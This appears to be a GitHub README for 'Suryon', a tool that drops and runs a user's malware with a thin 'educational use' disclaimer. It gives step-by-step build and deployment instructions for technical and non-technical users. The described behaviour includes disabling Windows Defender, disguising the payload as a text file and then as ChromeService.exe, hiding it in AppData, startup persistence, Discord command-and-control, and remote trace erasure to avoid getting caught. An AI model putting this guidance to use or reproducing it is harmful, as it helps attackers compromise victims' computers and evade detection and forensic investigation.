# ☀️ SURYON: The Solar Phantom  
*"Born of the Sun. Forged in Shadows. Delivered in Silence."*

---

> ⚠️ **LEGAL NOTICE**  
> This software is strictly intended for **educational, ethical testing, and research** purposes on systems you own or have **explicit permission** to test.  
> The author holds **no responsibility** for any misuse or unauthorized deployments.

---

## 🧠 What is Suryon?

**Suryon** is a stealth-deployed, Discord-commanded cleanup utility that rides alongside your payload.  
It's not the malware — it's the *clean exit.*

When you're done running your tool and need to erase all traces — **you call Suryon**.  
It listens. It acts. It *vanishes*.

---

## ❗ Why Suryon?

We all have malwares.  
We all want to deploy them.  
But the real problem?

> ❌ They leave traces.  
> ❌ You can’t clean up remotely.  
> ❌ You need to touch the machine again.  
> ❌ You risk getting caught.

**Not anymore.**

Suryon is your **last command**.  
Your **digital assassin**.  
Your **auto-eraser** from a Discord whisper.

---

## ⚙️ Core Features

- 🕶️ **Stealth Deployment**  
  Hides itself inside `%APPDATA%\AdobeSync`

- 🔁 **Persistence**  
  Registers itself at startup as `WinDriver`

- 💬 **Discord C2 (Command & Control)**  
  Control it from a Discord bot. No port forwarding. No servers.

- 🧨 **Command: `!cleanup`**  
  - Kills your payload
  - Deletes the payload
  - Removes itself from startup
  - Re-enables Windows Defender (if you disabled it)
  - Deletes its own folder
  - *Self-destructs*

---

## 🎛 GUI BUILDER.exe — [For the Lazy and the Legends]

### 🔧 Features:
- Paste your **Discord Token** and **Channel ID** into clean input fields
- One click → Auto-builds your Suryon `.exe` using **PyInstaller**
- Uses your custom `icon1.ico`
- Outputs your `.exe` inside the `dist/` folder
- No manual editing needed.  
  *(Unless you like pain.)*

---

# 🔥 Two Roads: Techies vs Non-Techies

---

## 🧪 Guide for Techies

### 🛠 Step-by-Step:

1. Clone the repo:
    ```bash
    git clone https://github.com/yourusername/suryon
    cd suryon
    ```

2. **Either:**
   - 🔹 Manually edit `main_template.py`:
     ```python
     DISCORD_TOKEN = 'your_token'
     CHANNEL_ID = 123456789012345678
     ```
   - 🔹 OR run the GUI Builder:
     ```bash
     GUI_BUILDER.exe
     ```

3. Drop your malware as `payload.txt` in the same folder.  
   *(This bypasses Defender at first glance)*

4. Compile with:
    ```bash
    pyinstaller --onefile --noconsole --icon=icon1.ico main_final.py
    ```

5. Now you have **two files**:
    - `main_final.exe` (a.k.a. Suryon.exe)
    - `payload.txt` → your malware

6. Rename and place:
    ```
    payload.txt → payload.txt (unchanged)
    main_final.exe → Suryon.exe
    ```

7. Put both in the same directory.

8. **RUN Suryon.exe AS ADMINISTRATOR**

---

### 🚀 What Happens When You Run It?

1. 🔐 **Disables Windows Defender**
2. 🔃 Renames `payload.txt` → `payload.exe` → `ChromeService.exe`
3. 🌀 Renames `Suryon.exe` → `WinDriver.exe`
4. 📦 Moves both to `%APPDATA%\AdobeSync\`
5. 🫥 Hides the folder
6. 💣 Executes `ChromeService.exe` (your payload)
7. 🎮 Waits for commands from your Discord

---

## 🧙 Guide for Non-Techies

1. 📥 Download this repository

2. 🖱️ Double click on `GUI_BUILDER.exe`

3. 🧾 Paste your:
   - **Discord Bot Token**
   - **Channel ID**

4. 🚀 Click "Generate"

5. 🧾 Your compiled `main_final.exe` is now in the `/dist` folder.

6. 📁 Rename it to `Suryon.exe`  
   And place your malware renamed as `payload.txt` in the same folder.

7. ⚠️ **Run Suryon.exe as Administrator**

That’s it. Everything else is **automated.**

---

## 📡 Discord Commands

- `!ping` → Check if Suryon is online
- `!cleanup` → Complete self-destruction & cleanup

---

## 📁 The tree:-
%APPDATA%/
└── AdobeSync/
├──────ChromeService.exe ← Your Payload
└───── WinDriver.exe ← Suryon

---

## 📝 License

**MIT License**  
Use it. Fork it. Improve it.  
Just don’t abuse it.

---

## 🕶 Final Words

> Suryon isn’t a virus.  
> Suryon isn’t the threat.  
> Suryon is the **silent exit** —  
> **When the fire dies, and the shadows retreat... Suryon remains — to erase it all.**




